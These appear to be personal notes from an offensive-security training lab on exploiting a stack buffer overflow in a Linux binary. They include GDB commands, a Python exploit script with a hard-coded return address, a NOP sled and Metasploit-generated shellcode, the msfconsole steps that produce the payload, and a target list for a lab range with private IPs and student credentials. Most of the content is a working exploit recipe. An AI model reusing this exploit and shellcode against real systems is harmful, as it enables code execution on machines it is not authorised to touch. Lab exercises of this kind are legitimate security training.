    https://wiremask.eu/tools/buffer-overflow-pattern-generator/
_____________________________________________________________________________________________________________________
### Run GDB against the program you want to view
#### The disass command to see what the code is performing and the memory spaces
    gdb func
    info proc map
    disass getuserinput                               #This was a function found in the script.
_____________________________________________________________________________________________________________________
### Create a python script to run against the program in gbd.
#### Buffer to see when the program breaks, EIP to jump to the point in memory, nop sled to push your code into executable space in memory, print to view the output as you update the script. THIS SCRIPT IS FULLY UPDATED!
    buffer = "A" * 62
    
    #eip = "BBBB"
    eip = "\x59\x3b\xde\xf7"
    
    #0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\xf7"
    #0xf7f588ab "\xf7\xf5\x88\xab" "\xab\x88\xf5\xf7"
    #0xf7f645fb "\xf7\xf6\x45\xfb" "\xfb\x45\xf6\xf7"
    
    nop = '\x90' * 5
    
    buf =  b""                                                            #This is gotten from the msfconsole
    buf += b"\xd9\xc6\xba\x7b\x1d\x43\x22\xd9\x74\x24\xf4\x5e"            #commands that were ran below!!!!!!
    buf += b"\x31\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x15\x03\x56"
    buf += b"\x15\x99\xe8\x29\x29\x05\x8a\xfc\x4b\xdd\x81\x63"
    buf += b"\x1d\xfa\xb2\x4c\x6e\x6c\x43\xfb\xbf\x0e\x2a\x95"
    buf += b"\x36\x2d\xfe\x81\x4e\xb1\xff\x51\x26\xd9\x90\x30"
    buf += b"\xa5\x70\x6f\xe4\x66\x0b\x8e\xc7\x09"
    
    print(buffer + eip + nop + buf)
_____________________________________________________________________________________________________________________
### Open the gdb enviroment to unset the memory.
#### Use the find command to locate the memory thats vulnerable to update your script.
    env - gdb func
    show env
    unset LINES
    unset COLUMNS
    find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
_____________________________________________________________________________________________________________________
### Open gdb against the program func
#### This is for testing the script continuously as you UPDATE IT.
    gdb func
    run <<< $(python test.py)                     #The name of the script is test.py
_____________________________________________________________________________________________________________________
### Run msfconsole to get the shellcode to run the command in the script.
#### step will take several attempts of running the last command and pasting into script.
    msfconsole
    use payload/linux/x86/exec
    show options
    set CMD whoami
    show options
    generate -b "\x00" -f python                  #copy the output and place into python script may take a few tries.
_____________________________________________________________________________________________________________________
# Scheme of Maneuver:
## >Jump Box
### ->T1: 192.168.28.111
### ->T2: 192.168.28.105

## >Jump Box
### ->donovian_grey_host
#### -->T3: 192.168.150.245

#### Target Section:

## T1
### Hostname: Donovian_Webserver
#### IP: 192.168.28.111
#### OS: CentOS
#### Creds: comrade :: StudentWebExploitPassword
#### Last Known SSH Port: 2222
#### Action: Exploit binary.

## T2
### Hostname: Donovian-Terminal
#### IP: 192.168.28.105
#### OS: unknown
#### Creds: comrade :: StudentReconPassword
#### Last Known SSH Port: 2222

## T3
### Hostname: unknown
#### IP: 192.168.150.245
#### OS: unknown
#### Creds:unknown
#### Last Known SSH Port: unknown
#### PSP: Unknown
#### Malware: Unknown
#### Action: Exploit a network service on the machine
